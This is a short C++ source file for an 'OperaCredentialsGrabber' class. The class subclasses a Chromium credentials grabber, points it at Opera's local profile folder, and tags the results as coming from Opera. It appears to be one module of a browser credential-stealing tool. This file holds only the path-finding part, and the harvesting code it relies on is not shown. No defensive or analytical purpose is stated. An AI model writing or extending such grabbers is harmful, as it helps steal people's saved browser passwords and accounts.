#include "OperaCredentialsGrabber.hpp"

#include "Utils/Environment.hpp"

OperaCredentialsGrabber::OperaCredentialsGrabber() :
	ChromiumCredentialsGrabber(get_local_opera_path())
{
}

std::filesystem::path OperaCredentialsGrabber::get_local_opera_path()
{
	return Environment::expand_variables(OPERA_ROOT_FOLDER);
}

std::filesystem::path OperaCredentialsGrabber::get_user_data_path(const std::filesystem::path& app_root) const
{
	return app_root;
}

std::wstring OperaCredentialsGrabber::source() const
{
	return L"Opera";
}
